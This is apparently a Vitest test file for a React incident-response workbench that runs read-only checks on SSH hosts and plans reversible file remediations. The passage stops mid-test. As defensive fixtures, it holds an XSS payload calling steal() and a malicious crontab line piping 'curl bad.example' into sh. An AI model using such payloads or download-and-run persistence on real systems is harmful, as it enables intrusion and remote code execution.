import { readdirSync, readFileSync } from "node:fs";

import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";

import type {
  EmergencyCommandApi,
  EmergencyCommandCatalogItem,
  EmergencyCommandResult,
  EmergencyPathBatchItem,
  EmergencyPathReceipt,
} from "../shared/emergency-command-contract";
import {
  EmergencyCommandEmpty,
  EmergencyCommandError,
  EmergencyCommandGroupView,
  EmergencyCommandOutput,
  EmergencyCommandResultView,
  EmergencyCommandVerbatim,
  EmergencyCommandsPage,
  EmergencyCommandStatus,
  EmergencyCommandWorkbench,
  EmergencyIocPanel,
} from "./EmergencyCommandsPage";
import { EmergencyPathBatchChoose, EmergencyPathBatchDialog, EmergencyPathBatchItems } from "./EmergencyPathBatchDialog";
import { EmergencyPathDialog, EmergencyPathOutcome, EmergencyPathProperties, symbolicMode } from "./EmergencyPathDialog";
import { EmergencyPathLinesDialog } from "./EmergencyPathLinesDialog";
import { EmergencyPathMenu } from "./EmergencyPathMenu";

const api: EmergencyCommandApi & import("../shared/file-evidence-contract").FileEvidenceApi & import("../shared/local-scan-contract").LocalScanApi & import("../shared/process-watch-contract").ProcessWatchApi & import("../shared/sqlite-contract").SqliteHostApi = {
  fileEvidence: async () => { throw new Error(); },
  localScan: async () => { throw new Error(); },
  sqliteInspect: async () => { throw new Error(); },
  sqliteRows: async () => { throw new Error(); },
  sqliteDeletePlan: async () => { throw new Error(); },
  sqliteDeleteExecute: async () => { throw new Error(); },
  sqliteDeleteUndo: async () => { throw new Error(); },
  loadEmergencyCommandCatalog: async () => { throw new Error(); },
  runEmergencyCommand: async () => { throw new Error(); },
  inspectEmergencyPath: async () => { throw new Error(); },
  previewEmergencyPathLines: async () => { throw new Error(); },
  planEmergencyPathLines: async () => { throw new Error(); },
  planEmergencyPathAction: async () => { throw new Error(); },
  confirmEmergencyPathAction: async () => { throw new Error(); },
  executeEmergencyPathAction: async () => { throw new Error(); },
  cancelEmergencyPathAction: async () => { throw new Error(); },
  undoEmergencyPathAction: async () => { throw new Error(); },
  locateEmergencyHistoryCommand: async () => { throw new Error(); },
  extractEmergencyCommandIocs: async () => { throw new Error(); },
  planEmergencyPathBatch: async () => { throw new Error(); },
  confirmEmergencyPathBatch: async () => { throw new Error(); },
  stepEmergencyPathBatch: async () => { throw new Error(); },
  cancelEmergencyPathBatch: async (): Promise<void> => { throw new Error(); },
  probeProcessWatch: async () => { throw new Error(); },
  startProcessWatch: async () => { throw new Error(); },
  pollProcessWatch: async () => { throw new Error(); },
  stopProcessWatch: async () => { throw new Error(); },
  processWatchSummary: async () => { throw new Error(); },
  pickProcessWatchTool: async () => { throw new Error(); },
  planProcessWatchUpload: async () => { throw new Error(); },
  startProcessWatchUpload: async () => { throw new Error(); },
  listProcessWatchResidues: async () => { throw new Error(); },
  cleanProcessWatchResidue: async () => { throw new Error(); },
  listProcessWatchSources: async () => { throw new Error(); },
  readProcessWatchAccounting: async () => { throw new Error(); },
};

const command: EmergencyCommandCatalogItem = {
  commandHandle: "opaque-command",
  category: "network",
  title: "监听端口",
  description: "只读收集监听状态。",
  timeoutSeconds: 30, optIn: false,
};

const groups = [{ category: "network" as const, commands: [command] }];

const hostile = "</pre><script>steal()</script><img src=x onerror=steal()>";
const result: EmergencyCommandResult = {
  snapshotHandle: "opaque-snapshot",
  commandHandle: "opaque-command",
  resultKind: "permission-denied",
  exitCode: 1,
  output: `${hostile}\nroot:$6$salt$hash:19000:0:99999:7:::`,
  observedLineCount: 4,
  displayedLineCount: 2,
  findingLines: [0],
  findingReason: "标红的行不在发行版自带的 SUID 名单内。",
  truncated: true,
  command: "getent passwd",
  commandTruncated: false,
  rawOutput: "hostile raw",
  rawOutputTruncated: false,
  paths: [],
};

const offer = { pathHandle: "opaque-path", line: 1, path: "/usr/local/lib/pyshared/.helper", lineEditable: false, xinetdService: false };

describe("EmergencyCommandsPage", () => {
  it("renders an honest disconnected state", () => {
    const html = renderToStaticMarkup(<EmergencyCommandsPage bindingHandle={null} api={api} />);
    expect(html).toContain("连接 SSH 目标后");
    expect(html).toContain("内置的只读调查命令");
    expect(html).not.toContain("opaque-command");
  });

  // Connected, the page shows a compact toolbar and no title; while the
  // command list loads it had no heading at all for a screen reader.
  it("keeps its name for a screen reader once connected", () => {
    const html = renderToStaticMarkup(<EmergencyCommandsPage bindingHandle="binding" api={api} />);
    expect(html).toContain('<h1 class="emergency-commands-sr-only">应急命令工作台</h1>');
    expect(html).toContain("正在识别目标系统并加载命令目录");
  });

  it("says so only when the commands are the portable fallback", () => {
    const source = readFileSync(new URL("./EmergencyCommandsPage.tsx", import.meta.url), "utf8");
    // A machine that answered needs no announcement; one that did not is about
    // to give shallower answers than it could have, and that is worth a line.
    expect(source).toContain('state.catalog?.commandSet === "portable"');
    expect(source).toContain("下面给的是通用命令");
    // It says what to do about it, and never names the distribution.
    expect(source).toContain("重新加载再试");
    expect(source).not.toMatch(/\b(?:rhel|debian|suse|alpine)\b/iu);
  });

  it("renders only safe catalog metadata without a shell preview", () => {
    const html = renderToStaticMarkup(<EmergencyCommandWorkbench groups={groups} commands={[command]}
      selected={command} selectedHandle={command.commandHandle} runStatus="idle" result={null} runError={null}
      search="" onSelect={() => undefined} onRun={() => undefined} />);
    expect(html).toContain("监听端口");
    expect(html).toContain("只读收集监听状态");
    expect(html).toContain("30 秒上限");
    expect(html).toContain("运行只读调查");
    expect(html).not.toContain("ss -tulpen");
    expect(html).not.toContain("network-listen");
  });

  it("turns running off, and says why, once the command list has expired", () => {
    const html = renderToStaticMarkup(<EmergencyCommandWorkbench groups={groups} commands={[command]}
      selected={command} selectedHandle={command.commandHandle} runStatus="idle" result={null} runError={null}
      search="" blockedReason="命令列表已过期，先点“重新加载”" onSelect={() => undefined} onRun={() => undefined} />);
    const run = html.match(/<button[^>]*class="emergency-command-run"[^>]*>/u)?.[0] ?? "";
    expect(run).toContain('disabled=""');
    expect(run).toContain("命令列表已过期");
    const group = html.match(/<button[^>]*class="emergency-command-group-run"[^>]*>/u)?.[0] ?? "";
    expect(group).toContain('disabled=""');
    // Picking another check still works: only running needs a fresh list.
    expect(html.match(/<button[^>]*aria-pressed="true"[^>]*>/u)?.[0] ?? "").not.toContain("disabled");

    const source = readFileSync(new URL("./EmergencyCommandsPage.tsx", import.meta.url), "utf8");
    // Running renews the list from when it was accepted, and only a run that
    // came back counts; a refusal for staleness settles it at once.
    expect(source).toContain("if (startedAt !== null) setCatalogUsedAt(startedAt);");
    expect(source).toContain('includes("emergency-command-catalog-unavailable")');
    expect(source).toContain("useListExpiry(state.catalog, state.catalog?.expiresInSeconds ?? null, catalogUsedAt)");
  });

  it("keeps where checks run by kind and name, and never falls back to the host on its own", () => {
    const source = readFileSync(new URL("./EmergencyCommandsPage.tsx", import.meta.url), "utf8");
    // The choice is looked up in the list on screen, not kept as a handle of
    // an earlier list (every reload hands out new ones).
    expect(source).toContain("container.kind === runChoice.kind && container.name === runChoice.name");
    expect(source).not.toContain("useState<string | null>(null);\n  // Where the checks run");
    // A choice the list no longer has blocks running and says so.
    expect(source).toContain("之前选的运行位置已不在列表里，请重新选择");
    expect(source).toContain("（已不在列表里）");
    // Another page's request chooses the place, or says why it cannot.
    expect(source).toContain("只有正在运行的 Pod 能在里面运行检查");
    expect(source).toContain("运行位置已切到");
    // A new target clears the choice.
    expect(source).toMatch(/dispatch\(\{ type: "scope-changed", scope \}\);\n\s*\/\/[^\n]*\n\s*setRunChoice\(null\);/u);
  });

  it("renders the catalog as collapsible branches with a quick run per group", () => {
    const html = renderToStaticMarkup(<EmergencyCommandWorkbench groups={groups} commands={[command]}
      selected={command} selectedHandle={command.commandHandle} runStatus="idle" result={null} runError={null}
      search="" onSelect={() => undefined} onRun={() => undefined} />);
    expect(html).toContain("网络排查");
    expect(html).toContain('aria-expanded="true"');
    expect(html).toContain("快速执行");
    expect(html).toContain('aria-label="快速执行 网络排查 的 1 项调查"');

    const collapsed = renderToStaticMarkup(<EmergencyCommandWorkbench groups={groups} commands={[command]}
      collapsed={["network"]} selected={command} selectedHandle={command.commandHandle} runStatus="idle"
      result={null} runError={null} search="" onSelect={() => undefined} onRun={() => undefined} />);
    expect(collapsed).toContain('aria-expanded="false"');
    // Only the branch folds; the detail pane keeps showing what is selected.
    const tree = collapsed.slice(0, collapsed.indexOf("</aside>"));
    expect(tree).not.toContain("只读收集监听状态");
    expect(tree).toContain("快速执行");
  });

  it("shows an in-order group run with per-step progress and results", () => {
    const running = renderToStaticMarkup(<EmergencyCommandGroupView commands={[command]} run={{
      id: 1, snapshotHandle: "opaque-snapshot", category: "network",
      commandHandles: [command.commandHandle], entries: [], status: "loading",
    }} />);
    expect(running).toContain("网络排查 · 快速执行");
    expect(running).toContain("正在执行第 1 项，共 1 项");
    expect(running).toContain("监听端口");
    expect(running).not.toContain("opaque-command");

    const finished = renderToStaticMarkup(<EmergencyCommandGroupView commands={[command]} run={{
      id: 1, snapshotHandle: "opaque-snapshot", category: "network", commandHandles: [command.commandHandle],
      entries: [{ commandHandle: command.commandHandle, result, error: null, elapsedMs: 1230 }], status: "ready",
    }} />);
    expect(finished).toContain("已完成 1 项");
    expect(finished).toContain("1 项未成功");
    expect(finished).toContain("完成耗时 1.23 秒");
    expect(finished).toContain("权限不足");
  });

  it("renders hostile output as escaped plain text without hiding anything", () => {
    const html = renderToStaticMarkup(<EmergencyCommandResultView result={result} />);
    expect(html).toContain("&lt;/pre&gt;&lt;script&gt;steal()&lt;/script&gt;");
    expect(html).not.toContain("<script>");
    expect(html).not.toContain("<img src=x");
    // Nothing is hidden: what the target printed reaches the operator.
    expect(html).toContain("root:$6$salt$hash");
    expect(html).toContain("输出已按行数或大小上限截断");
    expect(html).toContain("权限不足");
  });

  it("keeps gaps and original line numbers when focusing on findings", () => {
    const html = renderToStaticMarkup(<EmergencyCommandOutput
      output={'# 范围：当前账号\n普通信息\n关注：<img src=x>\n缺口：权限不足\n# 已检查对象 2'}
      findingLines={[2]} focusFindings />);
    expect(html).not.toContain("普通信息");
    expect(html).toContain("缺口：权限不足");
    expect(html).toContain("# 范围：当前账号");
    expect(html).toContain('class="is-abnormal">3</span>');
    expect(html).toContain("&lt;img src=x&gt;");
    expect(html).not.toContain("<img");
  });

  it("shows incomplete group execution without claiming all checks finished", () => {
    const html = renderToStaticMarkup(<EmergencyCommandGroupView commands={[command]} run={{
      id: 1, snapshotHandle: "opaque-snapshot", category: "network", status: "stopped",
      commandHandles: [command.commandHandle, "pending-check"],
      entries: [{ commandHandle: command.commandHandle, result, error: null, elapsedMs: 100 }],
    }} />);
    expect(html).toContain("完成 1/2 项，1 项未执行");
    expect(html).not.toContain("已完成 2 项");
    expect(html).toContain("权限不足");
  });

  /** Highlights only exist where the core marked a line. */
  it("marks the abnormal output lines and counts them", () => {
    const marked = { ...result, resultKind: "success" as const, exitCode: 0,
      output: "/usr/bin/passwd\n/tmp/.hidden/bash\n/home/ctf/rootshell",
      observedLineCount: 3, displayedLineCount: 3, truncated: false,
      findingLines: [1, 2] };
    const html = renderToStaticMarkup(<EmergencyCommandResultView result={marked} />);
    expect(html).toContain("2 处需要关注");
    // The operator has to be told why, not just where.
    expect(html).toContain("标红的行不在发行版自带的 SUID 名单内。");
    expect(html).toContain('<span class="is-abnormal">/tmp/.hidden/bash');
    expect(html).toContain('<span class="is-abnormal">/home/ctf/rootshell');
    // The stock binary keeps the neutral rendering.
    expect(html).toContain("<span>/usr/bin/passwd");

    const quiet = renderToStaticMarkup(<EmergencyCommandResultView
      result={{ ...marked, findingLines: [] }} />);
    expect(quiet).not.toContain("处需要关注");
    expect(quiet).not.toContain("is-abnormal");
    // Nothing marked means nothing to explain.
    expect(quiet).not.toContain("标红的行");
  });

  it("offers a right-click only on the lines that named a file", () => {
    const named = {
      ...result,
      resultKind: "success" as const,
      exitCode: 0,
      output: "总用量 4\n-rwsr-xr-x 1 root root 17 8月 25 23:36 /usr/local/lib/pyshared/.helper",
      observedLineCount: 2,
      displayedLineCount: 2,
      findingLines: [1],
      truncated: false,
      paths: [offer],
    };
    const html = renderToStaticMarkup(
      <EmergencyCommandResultView result={named} onPathMenu={() => undefined} />,
    );
    expect(html).toContain("1 行可右键处置");
    expect(html).toContain('class="is-abnormal has-path"');
    expect(html).toContain("右键可对 /usr/local/lib/pyshared/.helper 处置");
    // The line above named nothing, so it stays an ordinary line.
    expect(html).toContain("<span>总用量 4");

    // Without a handler there is nothing to right-click, and no promise of one.
    const inert = renderToStaticMarkup(<EmergencyCommandResultView result={named} />);
    expect(inert).not.toContain("has-path");
    expect(inert).not.toContain("行可右键处置");
    expect(inert).not.toContain("右键可对");
  });

  it("names the file in the menu without offering to run anything", () => {
    const html = renderToStaticMarkup(
      <EmergencyPathMenu position={{ x: 10, y: 20 }} offer={offer} busy={false}
        onAction={() => undefined} onDismiss={() => undefined} />,
    );
    expect(html).toContain("/usr/local/lib/pyshared/.helper");
    // The local scan item only exists where the page wired it; this bare menu has none.
    expect(html).not.toContain("取回本机扫描");
    expect(html).toContain("查看属性");
    expect(html).toContain("去掉执行权限");
    expect(html).toContain("移除文件能力");
    expect(html).toContain("用残留恢复");
    expect(html).toContain("隔离");
    expect(html).toContain('role="menu"');
    expect(html).not.toContain("<em>");
    expect(html).toContain('role="separator"');
    // This file is not in the managed set, so the delete entry stays hidden.
    expect(html).not.toContain("删除指定行");
    // Every item leads to a plan the operator still has to read.
    expect(html).not.toContain("立即");
    expect(html).not.toContain("彻底删除");
  });

  it("offers line deletion only where the backend marked the path editable", () => {
    const editable = renderToStaticMarkup(
      <EmergencyPathMenu position={{ x: 10, y: 20 }} busy={false}
        offer={{ ...offer, path: "/etc/crontab", lineEditable: true, xinetdService: false }}
        onAction={() => undefined} onDismiss={() => undefined} />,
    );
    expect(editable).toContain("删除指定行…");
    const plain = renderToStaticMarkup(
      <EmergencyPathMenu position={{ x: 10, y: 20 }} busy={false}
        offer={{ ...offer, path: "/etc/crontab", lineEditable: false, xinetdService: false }}
        onAction={() => undefined} onDismiss={() => undefined} />,
    );
    expect(plain).not.toContain("删除指定行");
  });

  it("lets the operator read the picked lines before anything is deleted", () => {
    const preview = {
      previewHandle: "preview-one", pathHandle: offer.pathHandle, path: "/etc/crontab",
      totalLines: 6, truncated: false,
      lines: [
        { number: 1, text: "SHELL=/bin/sh", clipped: false },
        { number: 2, text: "* * * * * root curl bad.example | sh", clipped: false },
        { number: 3, text: "", clipped: false },
      ],
    };
    const html = renderToStaticMarkup(
      <EmergencyPathLinesDialog path="/etc/crontab" preview={preview}
        plan={null} receipt={null} busy={false} error={null}
        onPlan={() => undefined} onBack={() => undefined} onConfirm={() => undefined}
        onUndo={() => undefined} onClose={() => undefined} />,
    );
    expect(html).toContain("删除指定行");
    expect(html).toContain("curl bad.example | sh");
    // The comment-versus-delete distinction and the backup are stated up front.
    expect(html).toContain("注释");
    expect(html).toContain("lovelyres-backups");
    expect(html).toContain("从第");
    expect(html).toContain("到第");
    expect(html).toContain("生成删除计划");
    // Nothing confirms by default; the plan button needs a picked range.
    expect(html).toContain('disabled="" data-testid="emergency-path-lines-plan"');

    const plan = {
      planHandle: "plan-one", pathHandle: offer.pathHandle, path: "/etc/crontab",
      action: "delete-lines" as const, summary: "删除 /etc/crontab 第 2 行",
      dangerous: true, restoreDescription: "放回删除前的完整文件",
      state: "planned" as const, expiresInSeconds: 300, residue: null,
      removedLines: [{ number: 2, text: "* * * * * root curl bad.example | sh", clipped: false }],
    };
    const planned = renderToStaticMarkup(
      <EmergencyPathLinesDialog path="/etc/crontab" preview={preview}
        plan={plan} receipt={null} busy={false} error={null}
        onPlan={() => undefined} onBack={() => undefined} onConfirm={() => undefined}
        onUndo={() => undefined} onClose={() => undefined} />,
    );
    expect(planned).toContain("将要删除 1 行");
    expect(planned).toContain("将被删除的行");
    expect(planned).toContain("确认并删除");
    expect(planned).toContain("返回选择行");
    expect(planned).toContain("sh -n");
  });

  it("shows what will happen before it happens, and what happened after", () => {
    const detail = {
      pathHandle: offer.pathHandle,
      path: offer.path,
      kind: "file" as const,
      size: "125688",
      mode: "4755",
      ownerId: 0,
      groupId: 0,
      modifiedAt: "2026-08-25T23:31:00+00:00",
      executable: true,
    };
    const plan = {
      planHandle: "opaque-plan",
      pathHandle: offer.pathHandle,
      path: offer.path,
      action: "disarm" as const,
      summary: "change /usr/local/lib/pyshared/.helper permissions from 4755 to 0644",
      dangerous: true,
      restoreDescription: "restore the captured permission bits",
      state: "planned" as const,
      expiresInSeconds: 300,
      residue: null,
    };
    const planned = renderToStaticMarkup(
      <EmergencyPathDialog path={offer.path} action="disarm" detail={detail} plan={plan}
        receipt={null} busy={false} error={null}
        onConfirm={() => undefined} onClose={() => undefined} />,
    );
    expect(planned).toContain("去掉执行权限");
    expect(planned).toContain("4755（rwsr-xr-x）");
    expect(planned).toContain("change /usr/local/lib/pyshared/.helper permissions");
    expect(planned).toContain("restore the captured permission bits");
    expect(planned).toContain("确认并执行");

    const preparing = renderToStaticMarkup(
      <EmergencyPathDialog path={offer.path} action="disarm" detail={detail} plan={null}
        receipt={null} busy={true} error={null}
        onConfirm={() => undefined} onClose={() => undefined} />,
    );
    expect(preparing).toContain("正在生成操作计划，尚未修改文件");
    expect(preparing).toContain("准备中…");
    expect(preparing).toContain('<button type="button">取消</button>');
    const running = renderToStaticMarkup(
      <EmergencyPathDialog path={offer.path} action="disarm" detail={detail} plan={plan}
        receipt={null} busy={true} error={null}
        onConfirm={() => undefined} onClose={() => undefined} />,
    );
    expect(running).toContain("执行并复核中…");
    expect(running).toContain('<button type="button" disabled="">取消</button>');

    const done = renderToStaticMarkup(
      <EmergencyPathDialog path={offer.path} action="disarm" detail={detail} plan={plan}
        receipt={{ planHandle: "opaque-plan", path: offer.path, action: "disarm",
          passed: true, detail: "remote mode is 0644", restored: false, untouched: false, undoable: true }}
        busy={false} error={null} onConfirm={() => undefined} onClose={() => undefined} />,
    );
    expect(done).toContain("已完成，并在目标机上核对过。");
    expect(done).toContain("remote mode is 0644");
    expect(done).not.toContain("确认并执行");
    expect(done).toContain("撤销这次操作");
    expect(done).toContain("完成后 10 分钟内可以撤销一次。");

    const verified = { planHandle: "opaque-plan", path: offer.path, action: "disarm" as const,
      passed: true, detail: "remote mode is 0644", restored: false, untouched: false, undoable: true };
    const outcome = (props: Partial<Parameters<typeof EmergencyPathOutcome>[0]>) => renderToStaticMarkup(
      <EmergencyPathOutcome action="disarm" receipt={verified} undo={null} undoSpent={false} askingUndo={false}
        busy={false} error={null} onAskUndo={() => undefined} onKeep={() => undefined}
        onUndo={() => undefined} onClose={() => undefined} {...props} />,
    );
    // Asking says what comes back, and the safe choice comes first (it takes focus, see probe-ui).
    const asking = outcome({ askingUndo: true });
    expect(asking).toContain("这个文件会重新可以执行");
    expect(asking).toContain("只能撤销一次");
    expect(asking.indexOf("不撤销")).toBeLessThan(asking.indexOf("确认撤销"));
    expect(asking).toContain("确认撤销");
    expect(asking).not.toContain("撤销这次操作");
    expect(outcome({ askingUndo: true, action: "quarantine" })).toContain("原路径会重新出现这个文件");
    // Spent — whatever came back — it is not offered again.
    const undone = outcome({ undoSpent: true, undo: { planHandle: "opaque-plan", path: offer.path,
      undone: true, detail: "权限已经恢复为 4755" } });
    expect(undone).toContain("已撤销。");
    expect(undone).toContain("权限已经恢复为 4755");
    expect(undone).not.toContain("撤销这次操作");
    const declined = outcome({ undoSpent: true, undo: { planHandle: "opaque-plan", path: offer.path,
      undone: false, detail: "那次操作之后，目标机上的这个位置又有了变化，没有撤销。" } });
    expect(declined).toContain("没有撤销。");
    expect(declined).toContain("又有了变化");
    expect(outcome({ undoSpent: true, error: "撤销没有在时限内返回结果" })).toContain("role=\"alert\"");
    // Not verified, or not reversible: nothing to offer.
    expect(outcome({ receipt: { ...verified, undoable: false } })).not.toContain("撤销这次操作");

    const failed = renderToStaticMarkup(
      <EmergencyPathDialog path={offer.path} action="quarantine" detail={detail} plan={plan}
        receipt={{ planHandle: "opaque-plan", path: offer.path, action: "quarantine",
          passed: false, detail: "original path is still present", restored: true, untouched: false, undoable: false }}
        busy={false} error={null} onConfirm={() => undefined} onClose={() => undefined} />,
    );
    expect(failed).toContain("没有完成。");
    expect(failed).toContain("已还原到操作前的状态");

    // Refused before writing: says the file was left alone, never "could not restore".
    const refused = renderToStaticMarkup(
      <EmergencyPathDialog path={offer.path} action="disarm" detail={detail} plan={plan}
        receipt={{ planHandle: "opaque-plan", path: offer.path, action: "disarm",
          passed: false, detail: "权限位在你看过之后又被改过了，所以没有动它。", restored: false, untouched: true, undoable: false }}
        busy={false} error={null} onConfirm={() => undefined} onClose={() => undefined} />,
    );
    expect(refused).toContain("没有执行，文件保持原样。");
    expect(refused).not.toContain("未能自动还原");
    expect(refused).not.toContain("is-dangerous");

    const properties = renderToStaticMarkup(
      <EmergencyPathProperties path={offer.path} detail={detail} error={null}
        onClose={() => undefined} />,
    );
    expect(properties).toContain("能否运行还取决于账号权限、挂载选项和文件类型");
    expect(properties).toContain("122.7 KB（125688 字节）");
    expect(properties).not.toContain("确认并执行");
  });

  it("says what a residue restore will write, from what, and why it stays honest", () => {
    const residue = {
      source: { path: "/bin/ls.bak", sha256: "a".repeat(64), size: "133192", kind: "backup" as const },
      package: "coreutils",
      candidates: [
        { path: "/bin/ls.bak", sha256: "a".repeat(64), size: "133192", kind: "backup" as const },
        { path: "/bin/lsd", sha256: "b".repeat(64), size: "133192", kind: "variant" as const },
      ],
    };
    const plan = {
      planHandle: "opaque-plan",
      pathHandle: offer.pathHandle,
      path: "/bin/ls",
      action: "restore-residue" as const,
      summary: "用残留 /bin/ls.bak 的内容写回 /bin/ls，包归属 coreutils；当前内容留底为 /bin/ls.lh-replaced-x（仅属主可读）。写回后做软件包校验并试跑一次；能运行不代表可信。",
      dangerous: true,
      restoreDescription: "把留底的内容写回 /bin/ls，并删除该留底",
      state: "planned" as const,
      expiresInSeconds: 300,
      residue,
    };
    const planned = renderToStaticMarkup(
      <EmergencyPathDialog path="/bin/ls" action="restore-residue" detail={null} plan={plan}
        receipt={null} busy={false} error={null}
        onConfirm={() => undefined} onClose={() => undefined} />,
    );
    expect(planned).toContain("用残留恢复");
    expect(planned).toContain("能运行不代表可信");
    expect(planned).toContain("残留来源");
    expect(planned).toContain("/bin/ls.bak");
    expect(planned).toContain("aaaaaaaaaaaaaaaa…");
    expect(planned).toContain("包归属");
    expect(planned).toContain("coreutils");
    expect(planned).toContain("同目录其他残留");
    expect(planned).toContain("/bin/lsd");
    // The file read needs SFTP and may be absent; the plan still speaks.
    expect(planned).not.toContain("正在读取目标机上这个文件的当前状态");

    const done = renderToStaticMarkup(
      <EmergencyPathDialog path="/bin/ls" action="restore-residue" detail={null} plan={plan}
        receipt={{ planHandle: "opaque-plan", path: "/bin/ls", action: "restore-residue",
          passed: true,
          detail: "回读：/bin/ls 已与 /bin/ls.bak 的内容一致；原内容留底在 /bin/ls.lh-replaced-x。包校验：该文件未见差异；试跑：退出码 0（ls (GNU coreutils) 9.1）；能运行不代表可信",
          restored: false, untouched: false, undoable: true }}
        busy={false} error={null} onConfirm={() => undefined} onClose={() => undefined} />,
    );
    expect(done).toContain("已完成，并在目标机上核对过。");
    expect(done).toContain("包校验：该文件未见差异");
    expect(done).toContain("试跑：退出码 0");
    expect(done).toContain("能运行不代表可信");
    expect(done).toContain("撤销这次操作");

    const asking = renderToStaticMarkup(
      <EmergencyPathOutcome action="restore-residue"
        receipt={{ planHandle: "opaque-plan", path: "/bin/ls", action: "restore-residue",
          passed: true, detail: "d", restored: false, untouched: false, undoable: true }}
        undo={null} undoSpent={false} askingUndo={true} busy={false} error={null}
        onAskUndo={() => undefined} onKeep={() => undefined} onUndo={() => undefined}
        onClose={() => undefined} />,
    );
    expect(asking).toContain("把留底里保存的原内容写回这个命令");
    expect(asking).toContain("如果那次操作之后它又被改过，就不会动它");
  });

  it("reads a mode the way a listing on the target does", () => {
    expect(symbolicMode("4755")).toBe("rwsr-xr-x");
    expect(symbolicMode("0644")).toBe("rw-r--r--");
    expect(symbolicMode("1777")).toBe("rwxrwxrwt");
    expect(symbolicMode("2755")).toBe("rwxr-sr-x");
    // A set bit without the matching execute bit is the capital letter.
    expect(symbolicMode("4644")).toBe("rwSr--r--");
    expect(symbolicMode("nope")).toBe("nope");
  });

  it.each([
    { mode: "4700", kind: "file" as const, executable: true, text: "能否运行还取决于账号权限" },
    { mode: "4644", kind: "file" as const, executable: false, text: "脚本仍可能被解释器读取运行" },
    { mode: "0755", kind: "directory" as const, executable: true, text: "用于进入和访问目录" },
    { mode: null, kind: "file" as const, executable: false, text: "目标机未报告权限，无法判断" },
  ])("explains permission evidence without promising executability: $mode / $kind", (sample) => {
    const html = renderToStaticMarkup(<EmergencyPathProperties path="/tmp/evidence" detail={{
      pathHandle: "path-evidence", path: "/tmp/evidence", kind: sample.kind, mode: sample.mode,
      executable: sample.executable, size: "20", ownerId: 0, groupId: 0, modifiedAt: null,
    }} error={null} onClose={() => undefined} />);
    expect(html).toContain(sample.text);
    expect(html).not.toContain("任何人都跑得起来");
  });

  it("exposes loading, error, empty and empty-output states", () => {
    const emptyResult = { ...result, resultKind: "empty" as const, exitCode: 0, output: "",
      observedLineCount: 0, displayedLineCount: 0, findingLines: [], findingReason: null,
      truncated: false, command: "", commandTruncated: false, rawOutput: "",
      rawOutputTruncated: false, paths: [] };
    const html = [
      renderToStaticMarkup(<EmergencyCommandStatus label="执行中…" />),
      renderToStaticMarkup(<EmergencyCommandError message="固定公开错误" />),
      renderToStaticMarkup(<EmergencyCommandEmpty title="空目录" detail="没有项目" />),
      renderToStaticMarkup(<EmergencyCommandResultView result={emptyResult} />),
    ].join("");
    expect(html).toContain("aria-live=\"polite\"");
    expect(html).toContain("role=\"alert\"");
    expect(html).toContain("命令没有输出");
  });

  it("keeps phase one free of arbitrary input and adjacent action surfaces", () => {
    const source = readFileSync(new URL("./EmergencyCommandsPage.tsx", import.meta.url), "utf8");
    expect(source).toContain("api.loadEmergencyCommandCatalog(bindingHandle)");
    // Handles and nothing else, plus where to run it — and that is a handle
    // from the same catalogue too, never a container name or id.
    expect(source).toMatch(
      /api\.runEmergencyCommand\(\s*bindingHandle,\s*request\.snapshotHandle,\s*request\.commandHandle,\s*containerHandle \?\? undefined,\s*\)/u,
    );
    // Null is the target itself, which stays the default. The select picks
    // from this catalogue's own entries, and what a run sends is the handle
    // of the entry in the list on screen.
    expect(source).toContain("useState<RunChoice | null>(null)");
    expect(source).toContain("container.containerHandle === event.currentTarget.value");
    expect(source).toContain("setRunChoice(picked === undefined ? null : { kind: picked.kind, name: picked.name });");
    expect(source).toContain("const containerHandle = chosenPlace?.containerHandle ?? null;");
    expect(source).toContain("bindingHandle: string | null;");
    expect(source).not.toContain("SshTargetSummary");
    expect(source).not.toContain("EmergencyCommandsConnection");
    for (const forbidden of [
      "dangerouslySetInnerHTML",
      "contentEditable",
      "<textarea",
      "setInterval",
      "window.open",
      ["open", "Terminal"].join(""),
      ["open", "File"].join(""),
      ["export", "Command"].join(""),
      ["plan", "Mutation"].join(""),
      ["run", "CustomCommand"].join(""),
      "commandText",
      "remotePath",
      "sessionId:",
      "generation:",
    ]) expect(source).not.toContain(forbidden);
    // The run call carries handles and nothing else. It used to be pinned as
    // "no fourth argument at all", which stopped being the right rule once
    // there was a legitimate fourth — so the rule now names what that one may
    // be rather than forbidding the position.
    for (const call of source.match(/api\.runEmergencyCommand\([\s\S]*?\)/gu) ?? []) {
      const passed = call
        .slice(call.indexOf("(") + 1, call.lastIndexOf(")"))
        .split(",")
        .map((argument) => argument.trim())
        .filter((argument) => argument !== "");
      expect(passed).toHaveLength(4);
      // The first three are plain identifiers the page was handed — never a
      // literal, a template or anything it composed itself.
      for (const argument of passed.slice(0, 3)) {
        expect(argument).toMatch(/^[A-Za-z_$][\w$]*(?:\.[A-Za-z_$][\w$]*)?$/u);
      }
      // And the fourth is the container, or the target when there is none.
      expect(passed[3]).toBe("containerHandle ?? undefined");
    }
  });

  it("lets every file-action menu and dialog bring its own styles", () => {
    // They are opened from three pages. Borrowed from the workbench page's
    // sheet, the log page showed the evidence dialog as bare text below the
    // page, and the integrity page did too whenever it was opened first.
    const directory = new URL("./", import.meta.url);
    const users = readdirSync(directory)
      .filter((name) => name.endsWith(".tsx") && !name.includes(".test."))
      .filter((name) => /className="[^"]*emergency-path-(?:backdrop|dialog|menu)\b/u
        .test(readFileSync(new URL(name, directory), "utf8")));
    expect(users.sort()).toEqual([
      "EmergencyCommandsPage.tsx", "EmergencyPathBatchDialog.tsx", "EmergencyPathDialog.tsx",
      "EmergencyPathLinesDialog.tsx",
      "EmergencyPathMenu.tsx", "FileEvidenceDialog.tsx", "LocalScanDialog.tsx", "LogRulesDialog.tsx",
      "ProcessWatchPanel.tsx",
    ]);
    for (const name of users) {
      expect(readFileSync(new URL(name, directory), "utf8"), name).toContain('import "./emergency-path.css";');
    }
    const page = readFileSync(new URL("./emergency-commands.css", import.meta.url), "utf8");
    expect(page).not.toContain(".emergency-path-");
  });

  it("offers the escaped raw output as its own tab and keeps the executed command visible up front", () => {
    const verbatim = {
      ...result,
      command: "docker exec -i c1 sh -c 'id\\r'",
      commandTruncated: false,
      rawOutput: "<script>steal()</script>\\x1b[31mcolored",
      rawOutputTruncated: false,
    };
    const html = renderToStaticMarkup(<EmergencyCommandResultView result={verbatim}
      writeClipboard={async () => undefined} />);
    for (const label of ["全部输出", "关注与缺口", "原始输出"]) {
      expect(html).toContain(`>${label}</button>`);
    }
    expect(html).not.toContain(">执行的命令</button>");
    // No click needed: the block names itself and carries the full command,
    // folded to a few lines rather than hidden behind a tab.
    expect(html).toContain("实际运行的命令");
